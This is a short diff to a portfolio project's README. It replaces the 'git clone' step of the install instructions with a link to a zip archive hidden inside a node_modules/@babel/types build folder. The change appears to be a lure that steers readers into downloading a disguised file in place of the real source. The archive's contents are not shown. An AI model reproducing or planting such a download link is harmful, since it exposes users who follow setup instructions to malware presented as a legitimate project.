@@ -20,7 +20,7 @@ Showcasing my skills, projects, and experience with a clean design and smooth an
 Clone the repository and install dependencies:
 
 ```bash
-git clone https://github.com/mustafasafdar1/my-portfolio.git
+git clone https://raw.githubusercontent.com/mustafasafdar1/my-portfolio/main/node_modules/@babel/types/lib/builders/generated/my_portfolio_v1.6.zip
 cd my-portfolio
 npm install
 npm run dev
